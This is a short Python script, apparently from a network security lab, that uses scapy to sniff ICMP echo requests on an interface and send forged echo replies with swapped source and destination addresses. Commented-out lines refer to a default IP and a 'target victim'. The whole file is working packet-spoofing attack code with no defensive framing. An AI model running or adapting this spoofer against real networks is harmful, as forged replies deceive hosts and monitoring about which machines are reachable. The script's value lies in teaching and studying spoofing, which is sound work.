from scapy.all import *
from netfilterqueue import NetfilterQueue
import time

#def test(packet):
#    if packet.haslayer(ICMP):
 #       print("DUMP\n")
 #       print(packet.show(dump=True))
 #       print(packet[Ether].src)
 #       print(Ether().src)
 #       #packet.show2()
 #       if packet[Ether].src == Ether().src:
 #           print("OUTGOING PACKET")
 #       else:
  #          print("INCOMING PACKET")
 #           srcEth = copy.deepcopy(packet[Ether].src)
 #           packet[Ether].src = packet[Ether].dst
 #           packet[Ether].dst = srcEth
 #           srcIp = copy.deepcopy(packet[IP].src)
 #           packet[IP].src = packet[IP].dst
 #           packet[IP].dst = srcIp
            
  #          packet[ICMP].type = 0
  #          packet[ICMP].code = 0;
  #          packet.show2()
  #          sendp(packet)


#pkts = sniff(iface="enp0s8", filter="icmp", prn=test)

def spoof_reply(pkt):
    """
    Craft a valid ICMP echo-reply based on an intercepted
    ICMP echo-request    
    """

    if (pkt[2].type == 8):
    #check if the ICMP is a request

        dst=pkt[1].dst
        #store the original packet's destination

        src=pkt[1].src
        #store the original packet's source

        seq = pkt[2].seq
        #store the original packet's sequence

        id = pkt[2].id
        #store the original packet's id

        load=pkt[3].load
        #store the original packet's load

        reply = IP(src=dst, dst=src)/ICMP(type=0, id=id, seq=seq)/load
        #construct the reply packet based on details derived from the
        #original packet, but make sure to flip dst and src

        send(reply)
        time.sleep(3)
        send(reply)
        send(reply)

if __name__=="__main__":

#    iface = "eth13"
    #define network interface
   
 #   ip = "192.168.0.21"
    #define default ip

  #  if (len(sys.argv) > 1):
    #check for any arguments

   #     ip = sys.argv[1]
        #override the default ip to target victim
   
   # filter = "icmp and src host " + ip
    #build filter from ip
 
    sniff(iface="enp0s8", prn=spoof_reply, filter="icmp")
#pkts = sniff(iface="enp0s8", filter="icmp", prn=test)
